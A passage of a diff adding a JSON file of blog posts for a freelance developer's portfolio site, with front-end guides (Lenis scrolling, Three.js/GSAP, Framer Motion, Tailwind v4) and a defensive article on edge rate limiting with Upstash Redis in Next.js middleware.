+        "text": "By calculating widths relative to container bounding client rectangles instead of forcing layout recalculations on every frame, this slider runs smoothly at 60 frames per second without lagging mobile devices."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Designing a Multi-Step Medical Booking Flow UI"
+      },
+      {
+        "type": "paragraph",
+        "text": "A complicated booking form causes patients to abandon their appointments before finishing. The key to a high-performing medical booking flow UI is breaking down information collection into small, digestible steps: selecting the treatment category, picking a date and time slot, and entering contact details."
+      },
+      {
+        "type": "list",
+        "items": [
+          "Step 1: Choose procedure type (e.g., Dental Implant, Teeth Whitening, Routine Cleaning)",
+          "Step 2: Select preferred doctor and available time slot",
+          "Step 3: Collect patient contact info with inline form validation",
+          "Step 4: Show instant confirmation screen with calendar sync options"
+        ]
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Need Help Implementing This in Your Product?"
+      },
+      {
+        "type": "paragraph",
+        "text": "As an independent web developer, I build fast, production-ready web applications. If you need custom UI components or complete booking portals, [explore my full-stack web development services](/services) or [get in touch with Aafaque Nazir](/contact)."
+      }
+    ]
+  },
+  {
+    "id": "smooth-scrolling-lenis-react",
+    "slug": "smooth-scrolling-lenis-react",
+    "title": "Smooth Scrolling with Lenis and Clean Transitions in React",
+    "seoTitle": "Lenis Smooth Scroll in React: Complete Guide",
+    "description": "Learn how to integrate Lenis smooth scrolling in React with clean web design and reliable website interactions for high-performance apps.",
+    "publishedAt": "2026-11-12",
+    "updatedAt": "2026-11-12",
+    "readTime": "7 min read",
+    "category": "UI & Animation",
+    "tags": [
+      "Lenis",
+      "React",
+      "Smooth Scroll",
+      "Web Animation",
+      "Frontend"
+    ],
+    "author": {
+      "name": "Aafaque Nazir",
+      "role": "Freelance Full-Stack Developer",
+      "bio": "Independent web engineer building high-performance websites, e-commerce stores, and SaaS web applications for clients across India & worldwide.",
+      "avatar": "/og-image.png"
+    },
+    "quickAnswer": "Lenis is a lightweight JavaScript library that replaces native browser scrolling with inertial momentum physics, creating clean web design and smooth website interactions in React applications.",
+    "relatedProjectId": 10,
+    "faqs": [
+      {
+        "question": "Does Lenis work well with React and Next.js?",
+        "answer": "Yes. Lenis can be initialized inside a React useEffect hook or custom provider component, ensuring smooth scroll physics across routes while cleaning up event listeners on unmount."
+      },
+      {
+        "question": "How does Lenis affect mobile performance?",
+        "answer": "Lenis handles touch events efficiently, but you can configure it to disable or relax inertia on mobile devices to preserve native touch responsiveness and save CPU cycles."
+      },
+      {
+        "question": "Can I use Lenis with GSAP ScrollTrigger?",
+        "answer": "Yes. Lenis syncs cleanly with GSAP ScrollTrigger by updating the scroll position on every animation frame, ensuring your scroll-based animations stay perfectly aligned."
+      }
+    ],
+    "sections": [
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Why Native Browser Scrolling Falls Short"
+      },
+      {
+        "type": "paragraph",
+        "text": "Standard browser scroll behavior depends on operating system settings and hardware configurations. On Windows machines without precision trackpads, scrolling often feels abrupt and disjointed. When building high-end interfaces like the [Yacht Rentals / Sea Cross](/projects/10) platform, predictable and clean motion is crucial for creating a premium feel without hurting accessibility or performance."
+      },
+      {
+        "type": "paragraph",
+        "text": "To solve this, developers use inertial scroll libraries. Among modern options, Lenis stands out for its lightweight footprint, lack of heavy dependencies, and precise control over easing curves."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Setting Up Lenis in a React Application"
+      },
+      {
+        "type": "paragraph",
+        "text": "Integrating Lenis into a React component requires managing the requestAnimationFrame loop properly. Below is a clean, production-ready custom hook and provider setup that initializes Lenis and connects it with GSAP if your project requires scroll-triggered animations."
+      },
+      {
+        "type": "code",
+        "language": "tsx",
+        "caption": "React Lenis Provider Component",
+        "code": "import React, { useEffect } from 'react';\nimport Lenis from '@studio-freight/lenis';\n\ninterface SmoothScrollProps {\n  children: React.ReactNode;\n}\n\nexport default function SmoothScrollProvider({ children }: SmoothScrollProps) {\n  useEffect(() => {\n    const lenis = new Lenis({\n      duration: 1.2,\n      easing: (t) => Math.min(1, 1.001 - Math.pow(2, -10 * t)),\n      direction: 'vertical',\n      gestureDirection: 'vertical',\n      smooth: true,\n      mouseMultiplier: 1,\n      smoothTouch: false,\n      touchMultiplier: 2,\n    });\n\n    function raf(time: number) {\n      lenis.raf(time);\n      requestAnimationFrame(raf);\n    }\n\n    requestAnimationFrame(raf);\n\n    return () => {\n      lenis.destroy();\n    };\n  }, []);\n\n  return <>{children}</>;\n}"
+      },
+      {
+        "type": "callout",
+        "title": "Performance Tip",
+        "text": "Always destroy the Lenis instance inside the useEffect cleanup function. Failing to remove event listeners on route changes can cause memory leaks in single-page applications."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Handling Anchor Links and Focus States"
+      },
+      {
+        "type": "paragraph",
+        "text": "A common pitfall with custom scroll libraries is broken anchor tag navigation and keyboard accessibility. Because Lenis intercepts default scroll behavior, standard HTML anchor jumps (`href=\"#section\"`) will not animate correctly out of the box."
+      },
+      {
+        "type": "paragraph",
+        "text": "To fix this, capture click events on internal anchor links and call the Lenis scrollTo method explicitly:"
+      },
+      {
+        "type": "code",
+        "language": "tsx",
+        "caption": "Handling Smooth Anchor Navigation",
+        "code": "const handleScrollTo = (targetId: string) => {\n  const targetElement = document.getElementById(targetId);\n  if (targetElement && lenisInstance) {\n    lenisInstance.scrollTo(targetElement, {\n      offset: 0,\n      duration: 1.5,\n      easing: (t) => 1 - Math.pow(1 - t, 3),\n    });\n  }\n};"
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Checklist for Clean Web Design and Interactions"
+      },
+      {
+        "type": "list",
+        "items": [
+          "Disable smooth touch scrolling on mobile devices if native momentum feels more natural to users.",
+          "Test keyboard navigation (Tab and Spacebar) to ensure focus outlines remain visible and scroll position updates correctly.",
+          "Combine Lenis with CSS will-change properties sparingly to prevent GPU layer bloat.",
+          "Ensure your website loads quickly across all devices before adding complex animation layers."
+        ]
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Need Help Implementing This in Your Product?"
+      },
+      {
+        "type": "paragraph",
+        "text": "As an independent web developer based in Navi Mumbai, I build fast, production-ready web applications with clean animations and reliable user interfaces. Explore my [Full-Stack Web Development Services](/services) or [get in touch with Aafaque](/contact) to discuss your project requirements."
+      }
+    ]
+  },
+  {
+    "id": "threejs-gsap-scrolltrigger-react-guide",
+    "slug": "threejs-gsap-scrolltrigger-react-guide",
+    "title": "Integrating Three.js and GSAP ScrollTrigger in React for 3D Product Showcases",
+    "seoTitle": "Three.js and GSAP ScrollTrigger in React Guide",
+    "description": "Learn how to connect Three.js with GSAP ScrollTrigger in React to build 60 FPS scroll-driven 3D product showcases without performance drops.",
+    "publishedAt": "2026-11-11",
+    "updatedAt": "2026-11-11",
+    "readTime": "7 min read",
+    "category": "UI/UX & Animation",
+    "tags": [
+      "Three.js",
+      "GSAP",
+      "React",
+      "WebGL",
+      "Performance"
+    ],
+    "author": {
+      "name": "Aafaque Nazir",
+      "role": "Freelance Full-Stack Developer",
+      "bio": "Independent web engineer building high-performance websites, e-commerce stores, and SaaS web applications for clients across India & worldwide.",
+      "avatar": "/og-image.png"
+    },
+    "quickAnswer": "To sync Three.js with GSAP ScrollTrigger in React, update 3D mesh properties directly inside a GSAP timeline tied to scroll progress and clean up the timeline within a useGSAP or useEffect hook. Limit canvas pixel ratio to 2 and run animations outside React state to maintain a steady 60 frames per second.",
+    "relatedProjectId": 13,
+    "faqs": [
+      {
+        "question": "How do you prevent GSAP ScrollTrigger from running twice in React Strict Mode?",
+        "answer": "Wrap your animations inside the useGSAP hook from @gsap/react or use gsap.context() inside a standard useEffect. This records all created triggers and automatically reverts them when the component unmounts, preventing duplicate pins and memory leaks."
+      },
+      {
+        "question": "Should you store scroll progress in React state to update Three.js models?",
+        "answer": "No. Storing scroll progress in React state triggers component re-renders on every scroll tick, causing severe frame drops. Instead, mutate Three.js mesh transforms directly via GSAP tweens using direct object references."
+      },
+      {
+        "question": "How do you maintain 60 FPS on mobile devices with 3D scroll animations?",
+        "answer": "Cap the device pixel ratio at Math.min(window.devicePixelRatio, 2), compress GLTF models using Draco or Meshopt, bake complex lighting into textures to reduce draw calls, and pause the Three.js render loop when the canvas scrolls out of the viewport."
+      }
+    ],
+    "sections": [
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "The Problem with Traditional Scroll-Driven 3D in React"
+      },
+      {
+        "type": "paragraph",
+        "text": "Adding 3D models to web applications often leads to choppy scrolling, drained laptop batteries, and janky mobile performance. Many developers attempt to synchronize Three.js scenes with the DOM by storing window scroll positions in React state or context. When state updates 60 times a second, React reconciles the virtual DOM on every frame, starving the GPU and dropping render rates to unplayable levels."
+      },
+      {
+        "type": "paragraph",
+        "text": "To build an effective interactive 3D product showcase, WebGL and DOM scroll tracking must operate on separate tracks. React mounts the canvas and sets up the component lifecycle, while GSAP ScrollTrigger directly writes transformations to Three.js mesh instances without re-rendering the React tree."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Building the Bridge Between GSAP and Three.js"
+      },
+      {
+        "type": "paragraph",
+        "text": "When building the interactive product view for the [3D Burger Website / Smoked & Seared](/projects/13), the goal was to disassemble individual ingredients—top bun, sesame seeds, cheese, patty, and bottom bun—as the visitor scrolls past distinct nutritional sections. Instead of re-rendering, we target the position, rotation, and scale of child meshes directly using GSAP timelines."
+      },
+      {
+        "type": "code",
+        "language": "tsx",
+        "caption": "BurgerScene.tsx: Direct mesh mutation with useGSAP and ScrollTrigger",
+        "code": "import React, { useRef } from 'react';\nimport { Canvas } from '@react-three/fiber';\nimport { useGLTF } from '@react-three/drei';\nimport gsap from 'gsap';\nimport { ScrollTrigger } from 'gsap/ScrollTrigger';\nimport { useGSAP } from '@gsap/react';\nimport * as THREE from 'three';\n\ngsap.registerPlugin(ScrollTrigger);\n\ninterface BurgerModelProps {\n  containerRef: React.RefObject<HTMLDivElement | null>;\n}\n\nfunction BurgerModel({ containerRef }: BurgerModelProps) {\n  const groupRef = useRef<THREE.Group>(null);\n  const topBunRef = useRef<THREE.Mesh>(null);\n  const pattyRef = useRef<THREE.Mesh>(null);\n  const bottomBunRef = useRef<THREE.Mesh>(null);\n\n  const { nodes, materials } = useGLTF('/models/burger.glb') as any;\n\n  useGSAP(\n    () => {\n      if (!groupRef.current || !containerRef.current) return;\n\n      const tl = gsap.timeline({\n        scrollTrigger: {\n          trigger: containerRef.current,\n          start: 'top top',\n          end: 'bottom bottom',\n          scrub: 1,\n        },\n      });\n\n      // Rotate the entire product during scroll\n      tl.to(groupRef.current.rotation, { y: Math.PI * 2, ease: 'none' }, 0);\n\n      // Explode layers vertically at specific scroll markers\n      if (topBunRef.current) {\n        tl.to(topBunRef.current.position, { y: 2.2, ease: 'power1.out' }, 0.2);\n      }\n      if (pattyRef.current) {\n        tl.to(pattyRef.current.position, { y: 0.5, ease: 'power1.out' }, 0.3);\n      }\n      if (bottomBunRef.current) {\n        tl.to(bottomBunRef.current.position, { y: -1.2, ease: 'power1.out' }, 0.2);\n      }\n    },\n    { scope: containerRef }\n  );\n\n  return (\n    <group ref={groupRef} dispose={null}>\n      <mesh ref={topBunRef} geometry={nodes.TopBun.geometry} material={materials.Bun} />\n      <mesh ref={pattyRef} geometry={nodes.Patty.geometry} material={materials.Meat} />\n      <mesh ref={bottomBunRef} geometry={nodes.BottomBun.geometry} material={materials.Bun} />\n    </group>\n  );\n}\n\nexport default function ProductShowcase() {\n  const containerRef = useRef<HTMLDivElement>(null);\n\n  return (\n    <div ref={containerRef} className=\"relative h-[300vh] bg-stone-900\">\n      <div className=\"sticky top-0 h-screen w-full\">\n        <Canvas\n          dpr={[1, 2]}\n          camera={{ position: [0, 0, 5], fov: 45 }}\n          gl={{ antialias: true, powerPreference: 'high-performance' }}\n        >\n          <ambientLight intensity={0.7} />\n          <directionalLight position={[10, 10, 5]} intensity={1.2} />\n          <BurgerModel containerRef={containerRef} />\n        </Canvas>\n      </div>\n    </div>\n  );\n}"
+      },
+      {
+        "type": "callout",
+        "title": "Clean Scope Management",
+        "text": "Always pass scope to useGSAP. This ensures all ScrollTrigger instances and tweens created inside the component are purged from memory when navigating away, preventing browser lag on subsequent page visits."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Critical Performance Techniques for WebGL Canvases"
+      },
+      {
+        "type": "paragraph",
+        "text": "Interactive 3D can quickly overwhelm mobile GPUs if default canvas settings are left untouched. To guarantee a stable 60 FPS across mid-range phones and high-resolution displays like Apple Retina screens, follow these production rules:"
+      },
+      {
+        "type": "list",
+        "items": [
+          "Cap the Device Pixel Ratio: Never render at native 3x or 4x pixel ratios. Use dpr={[1, 2]} in your Canvas component to prevent the GPU from filling millions of unneeded pixels.",
+          "Use Compressed Assets: Convert GLTF files to GLB format and compress them using KTX2 textures and Draco geometry compression to cut download payloads from 25MB down to 2MB.",
+          "Bake Static Lighting: Calculate ambient occlusion and detailed shadows in Blender before export. Real-time dynamic shadows consume heavy frame budgets on mobile devices.",
+          "Implement Viewport Observers: Use IntersectionObserver to stop the requestAnimationFrame render loop entirely when the 3D canvas is scrolled off-screen."
+        ]
+      },
+      {
+        "type": "paragraph",
+        "text": "For luxury travel experiences like [Yacht Rentals / Sea Cross](/projects/10), pairing smooth scroll libraries like Lenis with GSAP ScrollTrigger ensures the camera and mesh interpolations match human finger swipes without stutter."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Need Help Implementing This in Your Product?"
+      },
+      {
+        "type": "paragraph",
+        "text": "If you want to replace static product photography with interactive 3D web experiences that run smoothly across desktop and mobile devices, I can help design and build the front-end architecture. Check out my [Full-Stack Web Development Services](/services) or [get in touch with Aafaque](/contact) to discuss your project requirements."
+      }
+    ]
+  },
+  {
+    "id": "building-60fps-animations-framer-motion",
+    "slug": "building-60fps-animations-framer-motion",
+    "title": "Building 60fps Micro-Animations in React Using Framer Motion Without Layout Thrashing",
+    "seoTitle": "React 60fps Micro-Animations with Framer Motion",
+    "description": "Learn how to build smooth 60fps React micro-animations with Framer Motion by avoiding layout thrashing and animating only compositor properties.",
+    "publishedAt": "2026-11-10",
+    "updatedAt": "2026-11-10",
+    "readTime": "7 min read",
+    "category": "UI/UX & Animation",
+    "tags": [
+      "Framer Motion",
+      "React Performance",
+      "60fps",
+      "UI/UX"
+    ],
+    "author": {
+      "name": "Aafaque Nazir",
+      "role": "Freelance Full-Stack Developer",
+      "bio": "Independent web engineer building high-performance websites, e-commerce stores, and SaaS web applications for clients across India & worldwide.",
+      "avatar": "/og-image.png"
+    },
+    "quickAnswer": "To maintain 60fps in React with Framer Motion, animate only GPU-accelerated CSS properties like transform and opacity, and avoid triggering layout recalculations during active animation frames.",
+    "relatedProjectId": 14,
+    "faqs": [
+      {
+        "question": "Why do React animations lag and drop below 60fps?",
+        "answer": "Animations lag when they trigger browser style recalculations, layout reflows, and paint operations on every frame. Animating properties like width, height, margin, or top forces the browser to recalculate element geometry continuously."
+      },
+      {
+        "question": "How does Framer Motion help achieve 60fps performance?",
+        "answer": "Framer Motion simplifies GPU acceleration by default, handling animations through the browser composite thread when using transform and opacity properties. This bypasses layout and paint phases entirely for smoother playback."
+      },
+      {
+        "question": "Where can I see these performance techniques applied in a live project?",
+        "answer": "These exact performance patterns are utilized in the multi-step appointment booking flows built for the [LA Salon & Spa / Lumina Aura](/projects/14) project, ensuring fast user interactions."
+      }
+    ],
+    "sections": [
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Understanding Layout Thrashing in React Applications"
+      },
+      {
+        "type": "paragraph",
+        "title": "",
+        "text": "When building user interfaces in React, it is easy to trigger layout thrashing without realizing it. Layout thrashing happens when JavaScript repeatedly writes to layout properties and then immediately reads them back within the same frame. This forces the browser to synchronously recalculate geometry before moving to the next frame, causing stutter, dropped frames, and sluggish UI responses."
+      },
+      {
+        "type": "paragraph",
+        "title": "",
+        "text": "When building multi-step interfaces like the ones found in the [LA Salon & Spa / Lumina Aura](/projects/14) project, keeping frame rates locked at 60fps is critical. If your application feels choppy during page transitions or modal openings, users notice immediately. Fixing this requires shifting our animation strategy away from layout-bound CSS properties and moving entirely to compositor-only properties."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "The Golden Rule: Animate Only Transform and Opacity"
+      },
+      {
+        "type": "paragraph",
+        "title": "",
+        "text": "The browser rendering pipeline consists of three main phases: Layout, Paint, and Composite. Changing properties like height, width, padding, or position triggers the Layout phase. Changing color or background triggers the Paint phase. However, changing transform and opacity only triggers the Composite phase."
+      },
+      {
+        "type": "code",
+        "language": "tsx",
+        "caption": "Bad: Triggers layout recalculations",
+        "code": "// Avoid animating width/height or top/left\n<motion.div\n  animate={{ width: 300, top: 20 }}\n  transition={{ duration: 0.3 }}\n/>"
+      },
+      {
+        "type": "code",
+        "language": "tsx",
+        "caption": "Good: Runs purely on the GPU composite thread",
+        "code": "// Use scale and translate for layout shifts\n<motion.div\n  animate={{ scaleX: 1.2, y: 20, opacity: 1 }}\n  transition={{ duration: 0.3, ease: [0.16, 1, 0.3, 1] }}\n/>"
+      },
+      {
+        "type": "callout",
+        "title": "Performance Benchmark Note",
+        "text": "Using scale instead of width eliminates layout shifts entirely. The browser paints the element once and simply stretches or moves its GPU texture layer across frames."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Managing React State Without Re-triggering Renders"
+      },
+      {
+        "type": "paragraph",
+        "title": "",
+        "text": "Another common pitfall is tying animation progress directly to React state updates. If you use standard useState hooks to track scroll position or mouse movement to drive animations, React will re-render the component tree on every tick. This starves the main thread and ruins animation smoothness."
+      },
+      {
+        "type": "paragraph",
+        "title": "",
+        "text": "Framer Motion solves this by using internal refs and direct DOM mutations for high-frequency animations. For complex component states or custom UI components, you can pair Framer Motion with standard React hooks efficiently."
+      },
+      {
+        "type": "list",
+        "items": [
+          "Keep animation triggers decoupled from heavy state management loops.",
+          "Use CSS variables or Framer Motion's useMotionValue and useTransform hooks for continuous values.",
+          "Avoid inline anonymous objects in transition props which force unnecessary re-creations on every render."
+        ]
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Need Help Implementing This in Your Product?"
+      },
+      {
+        "type": "paragraph",
+        "title": "",
+        "text": "As an independent web developer, I build fast, production-ready web applications with clean animations and solid performance. [Full-Stack Web Development Services](/services) or [Get in touch with Aafaque](/contact) to discuss your project requirements."
+      }
+    ]
+  },
+  {
+    "id": "mastering-tailwind-css-v4-oxide-engine-and-theme",
+    "slug": "mastering-tailwind-css-v4-oxide-engine-and-theme",
+    "title": "Mastering Tailwind CSS v4: The New Lightning-Fast Oxide Engine and CSS-First @theme Explained",
+    "seoTitle": "Mastering Tailwind CSS v4: Oxide Engine & @theme Guide",
+    "description": "Learn how Tailwind CSS v4 improves build speeds with the Rust-powered Oxide engine, replaces JS config with CSS-first @theme, and how to upgrade.",
+    "publishedAt": "2026-11-09",
+    "updatedAt": "2026-11-09",
+    "readTime": "7 min read",
+    "category": "Frontend Development",
+    "tags": [
+      "Tailwind CSS",
+      "CSS",
+      "Frontend Development",
+      "Performance"
+    ],
+    "author": {
+      "name": "Aafaque Nazir",
+      "role": "Freelance Full-Stack Developer",
+      "bio": "Independent web engineer building high-performance websites, e-commerce stores, and SaaS web applications for clients across India & worldwide.",
+      "avatar": "/og-image.png"
+    },
+    "quickAnswer": "Tailwind CSS v4 introduces the Rust-powered Oxide engine for extremely fast builds and replaces JavaScript configuration files with a CSS-first @theme directive.",
+    "relatedProjectId": 12,
+    "faqs": [
+      {
+        "question": "What is the main performance improvement in Tailwind CSS v4?",
+        "answer": "Tailwind CSS v4 introduces the Oxide engine written in Rust, which scans files and compiles CSS significantly faster than previous versions, often operating up to 10 times faster on large projects."
+      },
+      {
+        "question": "How do I configure custom colors and fonts in Tailwind v4?",
+        "answer": "Instead of modifying tailwind.config.js, Tailwind v4 uses standard CSS variables inside your main CSS file using the @theme directive."
+      },
+      {
+        "question": "Is tailwind.config.js still required in Tailwind v4?",
+        "answer": "No, tailwind.config.js is no longer required. All configuration, including content paths, plugins, and theme extensions, can now be handled directly inside your CSS file."
+      }
+    ],
+    "sections": [
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Why Tailwind CSS v4 Changes Everything"
+      },
+      {
+        "type": "paragraph",
+        "text": "For years, Tailwind v3 relied on a JavaScript configuration file and a Node.js-based scanner to generate utility classes. While effective, large codebases often suffered from build slowdowns during development. Tailwind CSS v4 completely rewrites the core engine in Rust, known as the Oxide engine. This native approach eliminates Node.js overhead during scanning and generates your stylesheets instantly. When building projects like the [Premium Burger Shop / H5 Texes Burger](/projects/12), keeping build times minimal helps maintain momentum during styling iterations."
+      },
+      {
+        "type": "paragraph",
+        "text": "Beyond raw speed, v4 cleans up project folder structures by removing the mandatory JavaScript configuration file. Everything now flows through standard CSS, aligning utility-first styling closer to native web standards."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Goodbye tailwind.config.js: Hello CSS-First @theme"
+      },
+      {
+        "type": "paragraph",
+        "text": "In older versions of Tailwind, custom design tokens lived in a separate JavaScript object. In v4, configuration moves directly into your main CSS entry file using the new `@theme` directive. This makes it trivial to map design tokens, fonts, and custom breakpoints without jumping between JavaScript and CSS files."
+      },
+      {
+        "type": "code",
+        "language": "css",
+        "caption": "Configuring design tokens in Tailwind v4 using CSS",
+        "code": "@import \"tailwindcss\";\n\n@theme {\n  --font-display: \"Inter\", sans-serif;\n  --color-brand-primary: #ff5722;\n  --color-brand-dark: #121212;\n  --breakpoint-3xl: 1920px;\n}"
+      },
+      {
+        "type": "callout",
+        "title": "Engineering Note",
+        "text": "Using native CSS variables inside the @theme block automatically registers them as utility classes, meaning `--color-brand-primary` immediately becomes available as `bg-brand-primary`, `text-brand-primary`, and `border-brand-primary`."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Step-by-Step Migration from v3 to v4"
+      },
+      {
+        "type": "paragraph",
+        "text": "Migrating an existing codebase from Tailwind v3 to v4 requires a few cleanups. Since PostCSS configuration changes and the import statement simplifies, you can complete the upgrade by following a few clear steps."
+      },
+      {
+        "type": "list",
+        "items": [
+          "Uninstall old PostCSS plugins and install the new `@tailwindcss/postcss` package.",
+          "Replace the three traditional directives (`@tailwind base; @tailwind components; @tailwind utilities;`) with a single `@import \"tailwindcss\";` statement.",
+          "Move any custom values from `tailwind.config.js` into your CSS file inside the `@theme` block and delete the old config file.",
+          "Update source file path detection if your templates are outside the default automatic scanner paths."
+        ]
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Need Help Implementing This in Your Product?"
+      },
+      {
+        "type": "paragraph",
+        "text": "As an independent web developer, I build fast, production-ready web applications with modern tooling. Explore my [Full-Stack Web Development Services](/services) or [get in touch with Aafaque](/contact) to discuss your next project."
+      }
+    ]
+  },
+  {
+    "id": "edge-rate-limiting-ddos-defense-apis",
+    "slug": "edge-rate-limiting-ddos-defense-apis",
+    "title": "Implementing Rate Limiting and DDoS Defense on Edge Networks for Public Web APIs",
+    "seoTitle": "Edge Rate Limiting & DDoS Defense for Web APIs",
+    "description": "Learn how to protect public web APIs from DDoS spikes and scraper abuse using edge workers, Upstash Redis sliding windows, and Next.js.",
+    "publishedAt": "2026-11-08",
+    "updatedAt": "2026-11-08",
+    "readTime": "7 min read",
+    "category": "Security & Architecture",
+    "tags": [
+      "api rate limiting edge workers",
+      "prevent ddos next js api",
+      "upstash redis rate limit react",
+      "Edge Computing",
+      "Web Security"
+    ],
+    "author": {
+      "name": "Aafaque Nazir",
+      "role": "Freelance Full-Stack Developer",
+      "bio": "Independent web engineer building high-performance websites, e-commerce stores, and SaaS web applications for clients across India & worldwide.",
+      "avatar": "/og-image.png"
+    },
+    "quickAnswer": "Edge rate limiting intercepts HTTP requests at global CDN nodes before they reach your origin database or compute server. By pairing edge workers with a distributed store like Upstash Redis using a sliding window algorithm, you block abusive traffic and volumetric DDoS spikes while keeping latency minimal.",
+    "relatedProjectId": 15,
+    "faqs": [
+      {
+        "question": "Why should rate limiting happen at the edge instead of the origin server?",
+        "answer": "When rate limiting runs on your primary server or database, abusive traffic still consumes compute cycles, memory, and database connections. Placing rate limiting on edge workers blocks malicious traffic at the CDN point of presence, preventing origin load and saving serverless execution costs."
+      },
+      {
+        "question": "Which rate-limiting algorithm is best for public APIs?",
+        "answer": "The sliding window counter algorithm is ideal. Unlike a fixed window counter, which allows twice the limit of requests across window boundaries, sliding window counters smooth out traffic spikes and stop boundary-burst exploits."
+      },
+      {
+        "question": "How do you identify clients behind shared NAT or dynamic IPs?",
+        "answer": "Use a compound key. Combine the client IP (from CF-Connecting-IP or X-Forwarded-For) with user agent hashes, API tokens, or session IDs. For anonymous public routes, prioritize IP plus browser fingerprinting headers."
+      }
+    ],
+    "sections": [
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "The Vulnerability of Origin-Bound API Defense"
+      },
+      {
+        "type": "paragraph",
+        "text": "Most developers implement rate limiting using an in-memory store like Express rate-limit or an internal Redis container running alongside their main backend. While this works for single-server hobby projects, it fails when traffic surges or when targeted by scrapers."
+      },
+      {
+        "type": "paragraph",
+        "text": "If a botnet floods your Next.js API routes with thousands of requests per second, each request still spins up a serverless function, consumes CPU time, and checks your database. By the time your backend responds with HTTP 429 Too Many Requests, your infrastructure bill has already climbed and legitimate users face high latency."
+      },
+      {
+        "type": "paragraph",
+        "text": "I encountered this exact problem while building [Aura Estate](/projects/15), a real estate portal with real-time property search and valuation estimates. Complex Supabase PostgreSQL queries for geospatial filters were vulnerable to aggressive scraping. Shifting rate checks to the network edge stopped unauthorized automated scrapers before they ever reached the database."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Setting Up Edge Rate Limiting with Upstash Redis and Next.js"
+      },
+      {
+        "type": "paragraph",
+        "text": "To stop DDoS attacks and brute-force traffic, your rate limiter needs to run on edge runtimes (such as Vercel Edge Middleware or Cloudflare Workers) and communicate with a low-latency database over HTTP REST rather than stateful TCP connections."
+      },
+      {
+        "type": "paragraph",
+        "text": "Upstash Redis works well here because it exposes an HTTP-based REST API that runs cleanly in lightweight edge environments without connection pool exhaustion. Here is a production-ready Next.js middleware implementation using a sliding window counter:"
+      },
+      {
+        "type": "code",
+        "language": "tsx",
+        "caption": "middleware.ts - Edge rate limiting with Upstash Redis",
+        "code": "import { NextRequest, NextResponse } from 'next/server';\nimport { Ratelimit } from '@upstash/ratelimit';\nimport { Redis } from '@upstash/redis';\n\n// Initialize Upstash Redis with edge-friendly REST client\nconst redis = new Redis({\n  url: process.env.UPSTASH_REDIS_REST_URL!,\n  token: process.env.UPSTASH_REDIS_REST_TOKEN!,\n});\n\n// Create a sliding window limiter: 20 requests per 10 seconds\nconst ratelimit = new Ratelimit({\n  redis,\n  limiter: Ratelimit.slidingWindow(20, '10 s'),\n  analytics: true,\n  prefix: '@edge-limiter',\n});\n\nexport async function middleware(request: NextRequest) {\n  // Target only public API routes\n  if (!request.nextUrl.pathname.startsWith('/api/')) {\n    return NextResponse.next();\n  }\n\n  // Extract client IP address safely\n  const ip = request.ip ?? request.headers.get('x-forwarded-for')?.split(',')[0] ?? '127.0.0.1';\n  \n  // Limit based on client IP\n  const { success, limit, remaining, reset } = await ratelimit.limit(ip.trim());\n\n  if (!success) {\n    return new NextResponse(\n      JSON.stringify({\n        error: 'Too Many Requests',\n        message: 'Rate limit exceeded. Please wait before retrying.',\n      }),\n      {\n        status: 429,\n        headers: {\n          'Content-Type': 'application/json',\n          'X-RateLimit-Limit': limit.toString(),\n          'X-RateLimit-Remaining': remaining.toString(),\n          'X-RateLimit-Reset': reset.toString(),\n          'Retry-After': Math.ceil((reset - Date.now()) / 1000).toString(),\n        },\n      }\n    );\n  }\n\n  const response = NextResponse.next();\n  response.headers.set('X-RateLimit-Limit', limit.toString());\n  response.headers.set('X-RateLimit-Remaining', remaining.toString());\n  return response;\n}\n\nexport const config = {\n  matcher: '/api/:path*',\n};"
+      },
+      {
+        "type": "callout",
+        "title": "Sliding Window vs Fixed Window",
+        "text": "Fixed window algorithms reset counters at round clock intervals (e.g., top of the minute). An attacker can send 20 requests at 11:59:59 and another 20 at 12:00:00, pushing 40 requests in two seconds. The sliding window algorithm looks back at the preceding interval to keep request flow steady."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "DDoS Defense Layers Beyond Simple IP Throttling"
+      },
+      {
+        "type": "paragraph",
+        "text": "IP-based throttling alone cannot stop distributed attacks because modern botnets cycle through thousands of residential proxy IP addresses. A reliable defensive strategy requires layered checks at the edge network:"
+      },
+      {
+        "type": "list",
+        "items": [
+          "Header Validation: Drop requests immediately if standard headers like User-Agent or Accept are missing, or if they match known scraping utility defaults.",
+          "Payload Size Constraints: Reject POST/PUT payloads larger than 50KB directly at the edge to prevent memory bloat on compute nodes.",
+          "Challenge Handshakes: Use Cloudflare Turnstile or similar invisible challenges on sensitive endpoints to differentiate human users from headless scripts.",
+          "Tiered Limits: Apply tighter limits (e.g., 5 requests per minute) on write operations like form submissions or password resets, while allowing higher thresholds on cached read endpoints."
+        ]
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Handling Edge Cache Shields for Static and Dynamic APIs"
+      },
+      {
+        "type": "paragraph",
+        "text": "Rate limiting is only half the battle. If your API returns data that changes infrequently, pairing your rate limiter with an Edge Cache Shield via the Cache-Control s-maxage directive cuts database load down to almost zero."
+      },
+      {
+        "type": "paragraph",
+        "text": "When building high-traffic endpoints, setting 'Cache-Control: public, s-maxage=60, stale-while-revalidate=300' lets the edge network serve cached responses directly from edge memory. The request never touches your rate-limiting Redis store or your database, absorbing volumetric read attacks automatically."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "title": "Need Help Hardening Your Web Application?"
+      },
+      {
